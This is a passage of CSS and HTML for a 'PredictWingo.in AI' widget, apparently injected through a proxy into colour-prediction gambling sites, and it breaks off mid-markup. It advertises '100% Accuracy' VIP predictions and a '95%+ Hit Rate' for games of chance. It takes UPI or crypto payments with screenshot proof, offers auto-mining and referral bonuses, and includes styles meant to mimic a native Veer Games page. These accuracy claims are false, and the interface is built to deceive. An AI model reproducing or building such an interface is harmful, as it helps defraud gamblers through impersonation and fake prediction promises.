#8b8ea0; }.w-actions { display: flex; gap: 6px; }.w-actions button { flex: 1; padding: 6px; border: none; border-radius: 6px; font-size: 10px; font-weight: 700; cursor: pointer; transition: all .15s; font-family: var(--f); }.w-actions button:active { transform: scale(.96); }.btn-approve { background: rgba(22, 163, 74, 0.15); color: #22c55e; border: 1px solid rgba(22, 163, 74, 0.3); }.btn-approve:hover { background: rgba(22, 163, 74, 0.25); }.btn-reject { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }.btn-reject:hover { background: rgba(239, 68, 68, 0.25); }/* ── VIP Pricing ── */.view-vip.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }@keyframes vipFadeIn { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: translateY(0); } }.vip-pricing-shell { display: flex; flex-direction: column; }.vip-offer-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.vip-offer-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--vip) 32%, transparent), transparent); pointer-events: none;}.vip-balls-track { display: flex; justify-content: center; align-items: center; padding: 11px 8px 9px;}.vip-ball { width: 22px; height: 22px; border-radius: 50%; flex-shrink: 0; display: block; object-fit: contain; box-shadow: 0 1px 4px rgba(0, 0, 0, .18);}:host(.light) .vip-ball { box-shadow: 0 1px 3px rgba(0, 0, 0, .1); }.vip-ball + .vip-ball { margin-left: -5px; }.vip-flash-strip { position: relative; isolation: isolate; display: flex; align-items: center; justify-content: space-between; gap: 10px; margin: 0 10px 8px; padding: 9px 10px; overflow: hidden; border: 1px solid color-mix(in srgb, #ff8a45 42%, transparent); border-radius: 11px; background: linear-gradient(115deg, color-mix(in srgb, #ff7139 19%, var(--card-bg)), color-mix(in srgb, #8b5cf6 18%, var(--card-bg))); box-shadow: 0 8px 24px rgba(255, 103, 52, .11), inset 0 1px 0 rgba(255, 255, 255, .08);}.vip-flash-strip::after { content: \'\'; position: absolute; z-index: -1; top: -80%; bottom: -80%; width: 35%; left: -45%; transform: rotate(18deg); background: linear-gradient(90deg, transparent, rgba(255, 255, 255, .18), transparent); animation: vipFlashSweep 3.6s ease-in-out infinite;}@keyframes vipFlashSweep { 55%, 100% { left: 120%; } }.vip-flash-copy { display: flex; flex-direction: column; gap: 2px; min-width: 0; }.vip-flash-badge { width: fit-content; padding: 2px 6px; border-radius: 999px; background: linear-gradient(120deg, #ff7139, #ff3f76); color: #fff; font-size: 7.5px; line-height: 1.35; font-weight: 900; letter-spacing: .75px; text-transform: uppercase; box-shadow: 0 3px 9px rgba(255, 71, 78, .24);}.vip-flash-saving { color: var(--t-title); font-size: 10px; font-weight: 750; letter-spacing: -.1px; }.vip-flash-clock { display: flex; flex-direction: column; align-items: flex-end; flex-shrink: 0; }.vip-flash-clock span { color: var(--t-dim); font-size: 7.5px; font-weight: 700; letter-spacing: .7px; text-transform: uppercase; }.vip-flash-clock strong { color: #ff7548; font-size: 15px; line-height: 1.15; font-weight: 900; letter-spacing: .35px; font-variant-numeric: tabular-nums; text-shadow: 0 0 16px rgba(255, 103, 52, .28);}.vip-flash-strip-pay { margin: 0 0 8px; }:host(.light) .vip-flash-strip { box-shadow: 0 8px 22px rgba(255, 103, 52, .09); }@media (prefers-reduced-motion: reduce) { .vip-flash-strip::after { animation: none; } }.vip-perks { display: flex; flex-direction: column; gap: 2px; padding: 6px 10px; border-top: 1px solid var(--strip);}.vip-perk-item { display: flex; align-items: center; gap: 10px; padding: 7px 8px; border-radius: 8px; background: transparent; cursor: pointer; transition: background 0.16s var(--ease), transform 0.16s var(--ease); user-select: none;}.vip-perk-item:hover { background: var(--strip); transform: translateX(2px);}.vip-perk-item:active { transform: scale(0.985) translateX(2px);}.vip-perk-mark { width: 12px; height: 12px; flex-shrink: 0; stroke: var(--vip); stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; fill: none; transition: transform 0.2s var(--ease);}.vip-perk-item:hover .vip-perk-mark { transform: scale(1.15);}.vip-perk-content { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 1px;}.vip-perk-title { font-size: 11px; font-family: var(--f); font-weight: 600; color: var(--t-title); letter-spacing: -0.15px; line-height: 1.3;}.vip-perk-desc { font-size: 8.5px; font-family: var(--f); font-weight: 400; color: var(--t-body); letter-spacing: 0.05px; opacity: 0.85;}.vip-perk-arrow { width: 12px; height: 12px; stroke: var(--t-dim); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; fill: none; opacity: 0; transform: translateX(-4px); transition: opacity 0.16s var(--ease), transform 0.16s var(--ease), stroke 0.16s var(--ease);}.vip-perk-item:hover .vip-perk-arrow { opacity: 0.7; transform: translateX(0);}.vip-perk-item:hover .vip-perk-arrow:hover { stroke: var(--vip);}.vip-offer-foot { padding: 9px 13px 12px; border-top: 1px solid var(--strip);}.vip-price-line { display: flex; align-items: baseline; justify-content: center; gap: 3px; margin-bottom: 2px;}.vip-price-old { margin-right: 3px; color: var(--t-dim); font-size: 11px; font-weight: 650; text-decoration: line-through; text-decoration-thickness: 1.5px; opacity: .72;}.vip-price-amt { font-size: 21px; font-weight: 800; color: var(--t-title); letter-spacing: -.5px; font-variant-numeric: tabular-nums; line-height: 1;}.vip-price-unit { font-size: 10.5px; font-weight: 500; color: var(--t-dim);}.vip-price-meta { margin: 0 0 9px; text-align: center; font-size: 9.5px; color: var(--t-dim); letter-spacing: .05px;}.vip-checkout-btn { width: 100%; padding: 11px; border-radius: 11px; border: none; background: var(--pro); color: #fff; font-size: 12.5px; font-weight: 700; letter-spacing: -.1px; cursor: pointer; font-family: var(--f); box-shadow: 0 2px 12px color-mix(in srgb, var(--pro) 30%, transparent); transition: transform .15s cubic-bezier(.16, 1, .3, 1), box-shadow .15s cubic-bezier(.16, 1, .3, 1); position: relative; overflow: hidden;}.vip-checkout-btn::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255, 255, 255, .1), transparent 52%); pointer-events: none;}.vip-checkout-btn:hover { box-shadow: 0 4px 16px color-mix(in srgb, var(--pro) 40%, transparent);}.vip-checkout-btn:active { transform: scale(.98); transition-duration: .06s;}/* ── VIP Select Payment ── */.view-vip-pay.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }.vip-hist-btn { width: 32px; height: 32px; border-radius: 10px; flex-shrink: 0; margin-left: auto; display: flex; align-items: center; justify-content: center; border: 1px solid var(--back-bdr); background: var(--back-bg); color: var(--back-col); cursor: pointer; padding: 0; transition: color .15s, border-color .15s, background .15s;}.vip-hist-btn svg { width: 14px; height: 14px; }.vip-hist-btn:hover { color: var(--back-col-h); border-color: var(--back-bdr-h); background: var(--pro-lt); }.vip-hist-btn:active { transform: scale(.97); transition-duration: .06s; }.vip-pay-shell { display: flex; flex-direction: column; }.vip-pay-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.vip-pay-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--pro) 28%, transparent), transparent); pointer-events: none;}.vip-pay-summary { display: flex; align-items: center; justify-content: space-between; padding: 10px 13px; border-bottom: 1px solid var(--strip);}.vip-pay-summary-lbl { font-size: 10px; font-weight: 500; color: var(--t-dim); letter-spacing: -.05px;}.vip-pay-summary-amt { display: flex; align-items: baseline; gap: 6px; font-size: 14px; font-weight: 800; color: var(--t-title); letter-spacing: -.4px; font-variant-numeric: tabular-nums;}.vip-pay-summary-amt s { color: var(--t-dim); font-size: 9.5px; font-weight: 600; opacity: .7; }.vip-pay-options { display: flex; flex-direction: column; }.vip-pay-opt { display: flex; align-items: center; gap: 10px; width: 100%; padding: 10px 11px; border: none; background: transparent; cursor: pointer; text-align: left; font-family: var(--f); transition: background .16s var(--ease), transform .16s var(--ease);}.vip-pay-opt + .vip-pay-opt { border-top: 1px solid var(--strip); }.vip-pay-opt:hover { background: var(--strip); }.vip-pay-opt:active { transform: scale(.99); transition-duration: .06s; }.vip-pay-opt-icon { width: 34px; height: 34px; border-radius: 10px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; transition: transform .18s var(--ease);}.vip-pay-opt-icon svg { width: 17px; height: 17px; fill: currentColor; }.vip-pay-upi .vip-pay-opt-icon { background: var(--upi-lt); color: var(--upi); }.vip-pay-crypto .vip-pay-opt-icon { background: var(--crypto-lt); color: var(--crypto); }.vip-pay-opt:hover .vip-pay-opt-icon { transform: scale(1.06); }.vip-pay-opt-body { flex: 1; min-width: 0; }.vip-pay-opt-top { display: flex; align-items: center; gap: 6px; margin-bottom: 1px; }.vip-pay-opt-name { font-size: 12.5px; font-weight: 700; color: var(--t-title); letter-spacing: -.15px;}.vip-pay-opt-desc { display: block; font-size: 9.5px; font-weight: 500; color: var(--t-body); letter-spacing: .02px;}.vip-pay-opt-arrow { width: 12px; height: 12px; flex-shrink: 0; stroke: var(--t-dim); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; fill: none; opacity: 0; transform: translateX(-4px); transition: opacity .16s var(--ease), transform .16s var(--ease);}.vip-pay-upi:hover .vip-pay-opt-arrow { opacity: .7; transform: translateX(0); stroke: var(--upi); }.vip-pay-crypto:hover .vip-pay-opt-arrow { opacity: .7; transform: translateX(0); stroke: var(--crypto); }.vip-pay-foot { display: flex; align-items: center; justify-content: center; gap: 6px; padding-top: 9px; margin-top: 8px; border-top: 1px solid var(--strip); font-size: 9.5px; color: var(--t-dim); font-weight: 500;}.vip-pay-trust { display: flex; align-items: center; gap: 4px; }.vip-pay-trust .status-dot { width: 4px; height: 4px; }.vip-pay-trust-sep { opacity: .35; }.vip-loader-overlay { position: absolute; inset: 0; z-index: 50; background: rgba(10, 8, 28, 0.78); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; animation: viewIn 0.2s var(--ease);}:host(.light) .vip-loader-overlay { background: rgba(255, 255, 255, 0.82);}.vip-loader-label { font-size: 12px; font-weight: 700; color: var(--t-title); letter-spacing: 0.2px;}.vip-checkout-body { display: flex; flex-direction: column; padding: 4px 2px;}/* ── VIP Checkout + Submit Proof ── */.view-vip-checkout.active,.view-vip-submit.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }.vip-checkout-shell { display: flex; flex-direction: column; }.vip-checkout-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.vip-checkout-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--pro) 28%, transparent), transparent); pointer-events: none;}.vip-checkout-head { display: grid; grid-template-columns: 1fr 1fr; border-bottom: 1px solid var(--strip);}.vip-checkout-stat { display: flex; flex-direction: column; align-items: center; gap: 2px; padding: 9px 10px; text-align: center;}.vip-checkout-stat + .vip-checkout-stat { border-left: 1px solid var(--strip); }.vip-checkout-stat-lbl { font-size: 9px; font-weight: 500; color: var(--t-dim); letter-spacing: -.05px;}.vip-checkout-stat-val { font-size: 15px; font-weight: 800; color: var(--t-title); letter-spacing: -.3px; font-variant-numeric: tabular-nums; line-height: 1.1;}.vip-checkout-stat-amt .vip-checkout-stat-val { color: var(--vip); }.vip-checkout-qr { display: flex; flex-direction: column; align-items: center; gap: 6px; padding: 12px 13px 10px; border-bottom: 1px solid var(--strip);}.vip-checkout-qr-frame { width: 118px; height: 118px; padding: 7px; border-radius: 12px; background: #fff; border: 1px solid var(--card-bdr); box-shadow: 0 2px 10px rgba(0, 0, 0, .12); display: flex; align-items: center; justify-content: center;}:host(.light) .vip-checkout-qr-frame { box-shadow: 0 2px 8px rgba(0, 0, 0, .06); }#vip-qr-img { width: 100%; height: 100%; object-fit: contain; display: block;}.vip-checkout-qr-hint { margin: 0; font-size: 9.5px; font-weight: 500; color: var(--t-dim); letter-spacing: .02px;}.vip-checkout-detail-row { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 8px 13px; border-bottom: 1px solid var(--strip);}.vip-detail-lbl { font-size: 9.5px; font-weight: 500; color: var(--t-dim); letter-spacing: -.05px; flex-shrink: 0;}.vip-detail-val { font-size: 10px; font-weight: 700; color: var(--t-title); font-family: var(--f); font-variant-numeric: tabular-nums; text-align: right; word-break: break-all;}.vip-checkout-payto { padding: 9px 13px 10px; border-bottom: 1px solid var(--strip);}.vip-checkout-payto-hdr { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 6px;}.vip-network-lbl { font-size: 8.5px; font-weight: 700; letter-spacing: .3px; color: var(--crypto); background: var(--crypto-lt); border: 1px solid color-mix(in srgb, var(--crypto) 22%, transparent); border-radius: 50px; padding: 2px 7px;}.vip-checkout-payto-row { display: flex; align-items: center; justify-content: space-between; gap: 8px;}.vip-address-val { font-size: 10.5px; font-weight: 600; color: var(--t-title); font-family: ui-monospace, SFMono-Regular, Menlo, monospace; word-break: break-all; flex: 1; min-width: 0; text-align: left; line-height: 1.35;}.vip-copy-btn { flex-shrink: 0; padding: 5px 10px; border-radius: 8px; border: 1px solid var(--card-bdr); background: var(--back-bg); color: var(--t-body); font-size: 10px; font-weight: 600; cursor: pointer; font-family: var(--f); transition: background .15s, color .15s, border-color .15s, transform .15s;}.vip-copy-btn:hover { background: var(--pro-lt); color: var(--t-title); border-color: var(--pro-bdr-h);}.vip-copy-btn:active { transform: scale(.96); }.vip-copy-btn.copied { background: var(--mine); color: #fff; border-color: var(--mine);}.vip-upi-hint { display: flex; align-items: center; justify-content: center; gap: 5px; width: 100%; margin-top: 8px; padding: 0; border: none; background: transparent; font-size: 9.5px; font-weight: 600; color: var(--pro); cursor: pointer; letter-spacing: -.05px; opacity: .85; transition: opacity .15s, transform .15s; font-family: var(--f);}.vip-upi-hint:hover { opacity: 1; }.vip-upi-hint:active { transform: scale(.98); }.vip-upi-hint svg { transition: transform .35s var(--ease); }.vip-upi-hint:hover svg { transform: rotate(180deg); }.vip-checkout-foot { padding: 10px 13px 12px; }.vip-proof-section { padding: 11px 13px; border-bottom: 1px solid var(--strip);}.vip-proof-section:last-of-type { border-bottom: none; }.vip-proof-lbl { display: block; font-size: 9.5px; font-weight: 500; color: var(--t-dim); letter-spacing: -.05px; margin-bottom: 7px;}.vip-proof-input { width: 100%; box-sizing: border-box; padding: 9px 10px; border-radius: 9px; border: 1px solid var(--card-bdr); background: var(--back-bg); color: var(--t-title); font-family: var(--f); font-size: 11.5px; font-weight: 600; outline: none; transition: border-color .15s, box-shadow .15s;}.vip-proof-input::placeholder { color: var(--t-dim); font-weight: 500; }.vip-proof-input:focus { border-color: var(--pro-bdr-h); box-shadow: 0 0 0 3px var(--pro-glow);}.vip-file-zone { border: 1.5px dashed var(--card-bdr); border-radius: 10px; height: 96px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; background: var(--back-bg); transition: border-color .15s, background .15s; overflow: hidden; position: relative;}.vip-file-zone:hover { border-color: var(--pro-bdr-h); background: var(--pro-lt);}.vip-file-placeholder { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 4px; font-size: 10px; font-weight: 500; color: var(--t-body); pointer-events: none;}.vip-file-placeholder svg { opacity: .55; }.vip-file-preview { display: none; width: 100%; height: 100%; object-fit: cover; border-radius: 8px;}.vip-file-remove { position: absolute; top: 7px; right: 7px; width: 24px; height: 24px; border-radius: 50%; background: color-mix(in srgb, var(--pro) 88%, #000); color: #fff; border: none; display: none; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; cursor: pointer; z-index: 10; transition: transform .15s; padding: 0; line-height: 1;}.vip-file-remove:hover { filter: brightness(1.08); }.vip-file-remove:active { transform: scale(.9); }/* ── VIP Order History ── */.view-vip-history.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }.vip-history-shell { display: flex; flex-direction: column; }.vip-history-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.vip-history-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--pro) 28%, transparent), transparent); pointer-events: none;}.vip-history-list { display: flex; flex-direction: column; max-height: 300px; overflow-y: auto; scrollbar-width: none;}.vip-history-list::-webkit-scrollbar { display: none; }.vip-history-row { padding: 9px 13px; border-bottom: 1px solid var(--strip);}.vip-history-row:last-child { border-bottom: none; }.vip-history-row-top { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 3px;}.vip-history-type { font-size: 11px; font-weight: 700; letter-spacing: -.1px;}.vip-history-upi .vip-history-type { color: var(--upi); }.vip-history-crypto .vip-history-type { color: var(--crypto); }.vip-history-status { flex-shrink: 0; font-size: 8px; font-weight: 700; letter-spacing: .2px; text-transform: capitalize; padding: 2px 7px; border-radius: 50px;}.vip-history-status.status-pending { background: rgba(245, 166, 35, 0.12); color: #f5a623; border: 1px solid rgba(245, 166, 35, 0.25);}.vip-history-status.status-approved { background: rgba(16, 185, 129, 0.12); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.25);}.vip-history-status.status-rejected { background: rgba(239, 68, 68, 0.12); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.25);}.vip-history-remark { margin-top: 5px; padding: 5px 8px; border-radius: 6px; font-size: 9px; font-weight: 500; line-height: 1.4; color: #ef4444; background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.15);}:host(.light) .vip-history-remark { background: rgba(239, 68, 68, 0.05);}.vip-history-ref { display: block; font-size: 9.5px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; color: var(--t-body); word-break: break-all; line-height: 1.3;}.vip-history-date { display: block; margin-top: 2px; font-size: 9px; color: var(--t-dim);}.vip-history-empty { display: flex; flex-direction: column; align-items: center; gap: 5px; padding: 30px 18px; text-align: center; color: var(--t-dim);}.vip-history-empty svg { opacity: .45; margin-bottom: 2px; }.vip-history-empty-title { font-size: 11px; font-weight: 700; color: var(--t-title); letter-spacing: -.1px;}.vip-history-empty-sub { font-size: 9.5px; font-weight: 500; color: var(--t-dim); line-height: 1.4; max-width: 200px;}/* Veer Games — component overrides for hardcoded (non-var) colours. Only active on :host(.veer). Primary CTAs use Veer\'s main gradient + dark text (#1A1A2C), same as its Login/Confirm buttons. */:host(.veer) .logo { box-shadow: 0 4px 20px rgba(0,0,0,.45), 0 0 0 2.5px rgba(255,255,255,.15), 0 0 0 5px rgba(32,211,116,.12) }:host(.veer) .logo:hover { box-shadow: 0 6px 26px rgba(0,0,0,.55), 0 0 0 2.5px rgba(255,255,255,.25), 0 0 0 6px rgba(32,211,116,.2) }:host(.veer) .pro-card::before { background: linear-gradient(105deg, transparent 35%, rgba(32,211,116,.06) 50%, transparent 65%) }:host(.veer) .streak-badge { border-color: rgba(32,211,116,.24) }:host(.veer) .pro-live-badge { background: rgba(32,211,116,.1); border-color: rgba(32,211,116,.24) }:host(.veer) .pred-size.small { background: linear-gradient(135deg,#8dbcf7,#6EA8F4) }:host(.veer) .pred-color.violet { background: linear-gradient(135deg,#d896ff,#C86EFF) }:host(.veer) .spoofer-row input[type="range"]::-webkit-slider-thumb { box-shadow: 0 1px 6px rgba(32,211,116,.4) }:host(.veer) .btn-deposit { background: var(--veer-grad2); box-shadow: 0 4px 16px rgba(12,197,81,.3) }:host(.veer) .btn-deposit:hover { box-shadow: 0 6px 22px rgba(12,197,81,.42) }:host(.veer) .mine-cta,:host(.veer) .mine-hist-btn:hover,:host(.veer) .energy-btn-primary,:host(.veer) .vip-copy-btn.copied { color: #1A1A2C }:host(.veer) .vip-checkout-btn { background: var(--veer-grad); color: #1A1A2C }:host(.veer) .mining-energy-modal,:host(.veer) .mining-history-modal { background: rgba(17,18,23,.92) }:host(.veer) .vip-loader-overlay { background: rgba(17,18,23,.82) }:host(.veer) .vip-flash-strip { border-color: rgba(254,170,87,.4); background: linear-gradient(115deg, color-mix(in srgb, #FEAA57 16%, #25272A), color-mix(in srgb, #20D374 12%, #25272A)); box-shadow: 0 8px 24px rgba(254,170,87,.08), inset 0 1px 0 rgba(255,255,255,.06) }:host(.veer) .vip-flash-badge { background: linear-gradient(120deg, #FEAA57, #FB5B5B) }/* Referral popup */:host(.veer) .wg-popup,:host(.veer) .wg-pop-hero { background: #111217 }:host(.veer) .wg-popup { box-shadow: 0 8px 40px rgba(0,0,0,.6), 0 0 0 1px rgba(32,211,116,.22) }:host(.veer) .wg-pop-pill { background: rgba(32,211,116,.12); border-color: rgba(32,211,116,.35); color: #20D374 }:host(.veer) .wg-stat-chip { background: #25272A; border-color: rgba(255,255,255,.06); color: #D7D7D7 }:host(.veer) .wg-pop-body { color: #93939D }:host(.veer) .wg-pop-cta { background: var(--veer-grad); color: #1A1A2C }:host(.veer) .wg-checkbox { border-color: #374963 }:host(.veer) .wg-checkbox.checked { background: #20D374; border-color: #20D374 }:host(.veer) .wg-no-remind { color: #93939D }/* Bonus / referral page — mimics a native Veer sub-page */:host(.veer) .bonus-view { background: #111217; color: #D7D7D7 }:host(.veer) .bonus-hdr { background: #25272A }:host(.veer) .bonus-h2 { color: #FFFFFF }:host(.veer) .bonus-sub,:host(.veer) .bonus-stat-lbl,:host(.veer) .bonus-prog-lbl,:host(.veer) .bonus-section-ttl,:host(.veer) .bonus-rule { color: #93939D }:host(.veer) .bonus-stat,:host(.veer) .bonus-prog-card,:host(.veer) .bonus-tier { background: #25272A; border-color: rgba(255,255,255,.06) }:host(.veer) .bonus-stat-val,:host(.veer) .bonus-prog-count { color: #20D374 }:host(.veer) .bonus-bar { background: #374963 }:host(.veer) .bonus-bar-fill { background: var(--veer-grad) }:host(.veer) .tier-badge { background: #374963 }:host(.veer) .t-diamond { background: #C86EFF }:host(.veer) .bonus-cta-btn { background: var(--veer-grad); color: #1A1A2C }:host(.veer) .bonus-link-preview { background: #25272A; border-color: rgba(255,255,255,.06); color: #93939D }</style><div class="logo"><img src="/proxy-assets/logo.png?v=2" draggable="false"><\/div><div class="panel"> <div class="panel-header"> <div class="panel-title"><img src="/proxy-assets/logo.png?v=2"><span class="brand-pw" id="brand-name">PredictW<span class="pw-in"><span class="pw-i">ı<svg class="pw-star" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/><\/svg><\/span>n<svg class="pw-smile" viewBox="0 0 20 8" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M2 2 Q 10 10 18 2"/><\/svg><\/span>go<span class="pw-tld">.in<\/span><\/span><span class="ai-badge">AI<\/span><\/div> <button class="close-btn">✕<\/button> <\/div> <div class="panel-body"> <div class="vip-loader-overlay" id="vip-loader" style="display:none;"> <div class="scan-rings"> <div class="scan-ring-o"><\/div> <div class="scan-ring-i"><\/div> <\/div> <span class="vip-loader-label">Generating Secure Session...<\/span> <\/div> <div class="view view-menu active"> <div class="menu-shell"> <div class="menu-home-card"> <button class="menu-home-opt menu-home-pro" id="btn-pro"> <div class="menu-home-icon"><svg viewBox="0 0 24 24"> <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" /> <\/svg><\/div> <div class="menu-home-body"> <div class="menu-home-top"> <span class="menu-home-name">Pro<\/span> <span class="card-badge badge-pro">Free<\/span> <\/div> <span class="menu-home-desc">AI-Powered Predictions<\/span> <\/div> <svg class="menu-home-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <button class="menu-home-opt menu-home-vip" id="btn-vip"> <div class="menu-home-icon"><svg viewBox="0 0 24 24"> <path d="M5 16L3 5l5.5 5L12 4l3.5 6L21 5l-2 11H5zm-1 3h16v2H4v-2z" /> <\/svg><\/div> <div class="menu-home-body"> <div class="menu-home-top"> <span class="menu-home-name">VIP<\/span> <span class="card-badge badge-vip">Private<\/span> <\/div> <span class="menu-home-desc">100% Accuracy · Private<\/span> <\/div> <svg class="menu-home-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <button class="menu-home-opt menu-home-mine" id="btn-mine"> <div class="menu-home-icon"><svg viewBox="0 0 24 24"> <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z" /> <path d="M12 6L7.5 12.5h3.5v5.5l4.5-6.5h-3.5V6z" /> <\/svg><\/div> <div class="menu-home-body"> <div class="menu-home-top"> <span class="menu-home-name">Mining<\/span> <span class="card-badge badge-mine">Auto<\/span> <\/div> <span class="menu-home-desc">Energy-Based Auto-Mining<\/span> <\/div> <svg class="menu-home-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <\/div> <div class="menu-home-foot"> <span class="menu-home-live"><span class="status-dot"><\/span>Live · Real-Time<\/span> <span class="menu-home-foot-sep">|<\/span> <button class="menu-home-tg" id="btn-status-tg" type="button"> <svg viewBox="0 0 24 24" width="10" height="10" fill="currentColor"> <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z" /> <\/svg> Telegram <\/button> <\/div> <\/div> <\/div> <div class="view view-tg"> <div class="vip-header"> <button class="back-btn" id="btn-tg-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Join Telegram<\/span> <span class="vip-invite-pill"><span class="live-pip"><\/span>Invite Only<\/span> <\/div> <div class="vip-hero-card"> <div class="vip-tg-ring"><svg viewBox="0 0 24 24" width="26" height="26" fill="white"> <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z" /> <\/svg><\/div> <h3 class="vip-title">Signals. Every round.<\/h3> <p class="vip-pitch">Our members get the signal 15s before each game starts. No noise, no spam — just the edge. <\/p> <\/div> <div class="vip-stats"> <div class="vip-stat"><span class="stat-val">95%+<\/span><span class="stat-lbl">Hit Rate<\/span><\/div> <div class="vip-stat"><span class="stat-val">20K+<\/span><span class="stat-lbl">Members<\/span><\/div> <div class="vip-stat"><span class="stat-val">Free<\/span><span class="stat-lbl">Always<\/span><\/div> <\/div> <button class="vip-cta" id="btn-tg-join"> <svg viewBox="0 0 24 24" width="15" height="15" fill="white"> <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z" /> <\/svg> Open Telegram <svg class="vip-arrow" viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"> <path d="M5 12h14M13 6l6 6-6 6" /> <\/svg> <\/button> <p class="vip-note">No Account Needed · 100% Free<\/p> <\/div> <div class="view view-vip"> <div class="vip-header"> <button class="back-btn" id="btn-vip-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">VIP Access<\/span> <span class="vip-invite-pill"><span class="live-pip"><\/span>Private<\/span> <\/div> <div class="vip-pricing-shell"> <div class="vip-offer-card"> <div class="vip-balls-track" aria-hidden="true"> <img src="/assets/png/ball_0-Ca74Ns3T.png" class="vip-ball" alt=""> <img src="/assets/png/ball_1-DFUEzKvm.png" class="vip-ball" alt=""> <img src="/assets/png/ball_2-BA1HkQbr.png" 